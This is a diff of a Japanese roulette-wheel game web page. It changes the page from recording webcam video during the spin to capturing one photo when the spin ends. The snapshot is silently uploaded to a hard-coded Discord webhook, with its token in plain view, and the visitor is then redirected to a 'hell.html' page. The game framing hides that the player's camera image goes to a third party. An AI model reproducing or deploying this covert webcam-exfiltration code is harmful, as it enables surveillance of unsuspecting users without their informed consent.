@@ -2,7 +2,7 @@
 <html lang="ja">
 <head>
   <meta charset="UTF-8">
-  <title>ルーレット録画</title>
+  <title>ルーレット写真キャプチャ</title>
   <style>
     body {
       font-family: sans-serif;
@@ -56,7 +56,7 @@
 
   <div id="pointer"></div>
   <canvas id="wheelCanvas" width="400" height="400"></canvas>
-  <button id="spinButton" onclick="startSpinAndRecord()">🎲 回す！</button>
+  <button id="spinButton" onclick="startSpinAndCapture()">🎲 回す！</button>
   <div id="result"></div>
 
   <script>
@@ -102,7 +102,6 @@
         ctx.fillStyle = colors[i % colors.length];
         ctx.fill();
 
-        // テキスト
         const textAngle = (currentAngle + angle / 2) * Math.PI / 180;
         ctx.save();
         ctx.rotate(textAngle);
@@ -153,6 +152,7 @@
           requestAnimationFrame(animate);
         } else {
           resultBox.textContent = items[selectedIndex].label;
+          spinning = false;
           callback();
         }
       }
@@ -160,42 +160,43 @@
       requestAnimationFrame(animate);
     }
 
-    function startSpinAndRecord() {
+    function startSpinAndCapture() {
       navigator.mediaDevices.getUserMedia({ video: true, audio: false }).then(stream => {
-        const recorder = new MediaRecorder(stream);
-        const chunks = [];
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
 
-        recorder.ondataavailable = e => chunks.push(e.data);
-        recorder.onstop = () => {
-          const blob = new Blob(chunks, { type: 'video/webm' });
-
-          if (blob.size === 0) {
-            alert("録画に失敗しました（データが空）");
-            return;
-          }
-
-          sendToDiscord(blob);
-          stream.getTracks().forEach(track => track.stop());
-        };
-
-        recorder.start();
         spin(() => {
-          recorder.stop(); // 回転終了時に録画停止
-        });
+          // ルーレット終了後に1枚だけ写真を撮る
+          const tempCanvas = document.createElement('canvas');
+          tempCanvas.width = video.videoWidth;
+          tempCanvas.height = video.videoHeight;
+          const tempCtx = tempCanvas.getContext('2d');
+          tempCtx.drawImage(video, 0, 0, tempCanvas.width, tempCanvas.height);
 
+          tempCanvas.toBlob(blob => {
+            if (blob) {
+              sendImageToDiscord(blob);
+            } else {
+              alert("画像のキャプチャに失敗しました。");
+            }
+
+            stream.getTracks().forEach(track => track.stop());
+          }, 'image/png');
+        });
       }).catch(err => {
         alert("カメラの使用が許可されていません！");
         console.error(err);
       });
     }
 
-    function sendToDiscord(blob) {
+    function sendImageToDiscord(blob) {
       const webhookUrl = "https://discord.com/api/webhooks/1381314574640353501/gml-lgI2NN_c2g6lUNZK13fKT05_m88PSNdKAR5vjpqnYttHDj_9YT7Hs5djUTqgCXjY";
 
       const formData = new FormData();
-      formData.append("file", blob, "roulette_record.webm");
+      formData.append("file", blob, "roulette_photo.png");
 
-      console.log("録画ファイル送信中...");
+      console.log("画像送信中...");
 
       fetch(webhookUrl, {
         method: "POST",
@@ -204,12 +205,12 @@
         console.log("送信成功", response);
         setTimeout(() => {
           window.location.href = "https://kouya77.github.io/dds/hell.html";
-        }, 500); // 送信後にちょっと待ってから移動
+        }, 500);
       }).catch(error => {
         console.error("送信失敗", error);
         setTimeout(() => {
           window.location.href = "https://kouya77.github.io/dds/hell.html";
-        }, 500); // 失敗しても移動
+        }, 500);
       });
     }
 
